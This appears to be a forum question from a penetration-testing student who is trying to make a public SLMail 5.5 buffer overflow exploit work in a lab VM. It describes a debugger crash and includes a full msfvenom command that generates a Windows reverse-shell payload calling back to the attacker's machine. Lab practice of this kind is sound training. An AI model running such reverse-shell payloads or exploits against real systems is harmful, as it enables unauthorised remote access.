  "content": "I am trying to make this exploit work and having some difficulty.\n\nSo I skipped to a 'fixed' version of it from here and the only thing I changed was the shell code:\nhttps://github.com/cokebottle/oscp-tools/blob/master/646-fixed.c\n\nThe program terminates showing error code In Immunity Debugger: BB010002. Even Google doesn't know what this error means. The last command causing program termination is C3, or opcode RETN, so it must have something to do with the stack. This op, that is causing the crash is part of my shell code, which I have generated as follows:\n\n```\nmsfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=<PWK VM IP> LPORT=443 -b '\\x00\\x0a\\x0d' -f c \n\n```\nThe SLMail is a default setup of 5.5 on a 32-bit windows 7 VM. I've been stuck here for over a week, so please do help as much as possible.\n\n",
